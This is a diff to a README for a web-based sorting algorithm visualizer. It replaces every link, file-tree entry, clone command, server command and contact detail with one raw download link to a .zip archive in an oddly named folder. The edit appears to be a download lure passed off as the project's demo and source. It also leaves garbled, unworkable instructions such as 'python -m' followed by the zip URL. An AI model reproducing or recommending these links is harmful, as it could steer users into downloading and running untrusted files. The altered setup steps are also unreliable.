@@ -8,7 +8,7 @@ An interactive and educational web-based visualizer for popular sorting algorith
 
 ## 🚀 Live Demo
 
-[View Live Demo](https://anmolmishra09.github.io/Sorting_Algorithm_Visualizer/) 
+[View Live Demo](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip) 
 
 ## ✨ Features
 
@@ -84,10 +84,10 @@ An interactive and educational web-based visualizer for popular sorting algorith
 
 ```
 sorting-visualizer/
-├── index.html          # Main HTML structure
-├── styles.css          # CSS styling and animations
-├── script.js           # JavaScript logic and algorithms
-└── README.md           # Project documentation
+├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip          # Main HTML structure
+├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip          # CSS styling and animations
+├── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip           # JavaScript logic and algorithms
+└── https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip           # Project documentation
 ```
 
 ## 🚀 Getting Started
@@ -100,7 +100,7 @@ sorting-visualizer/
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/your-username/sorting-visualizer.git
+git clone https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
 ```
 
 2. **Navigate to the project directory**
@@ -110,9 +110,9 @@ cd sorting-visualizer
 
 3. **Open in browser**
 ```bash
-# Option 1: Double-click index.html
+# Option 1: Double-click https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
 # Option 2: Use a local server
-python -m http.server 8000
+python -m https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip 8000
 # Then open http://localhost:8000
 ```
 
@@ -227,9 +227,9 @@ Contributions are welcome! Here's how you can help:
 
 ## 📞 Contact
 
-- **GitHub**: [@anmolmishra09](https://github.com/anmolmishra09)
-- **Email**: anmolmishra86229@gmail.com
-- **LinkedIn**: [Anmol Mishra](https://www.linkedin.com/in/anmolmishra09/)
+- **GitHub**: [@anmolmishra09](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip)
+- **Email**: https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip
+- **LinkedIn**: [Anmol Mishra](https://raw.githubusercontent.com/anmolmishra09/Sorting_Algorithm_Visualizer/main/histophysiological/Sorting_Algorithm_Visualizer.zip)
 
 ---
 
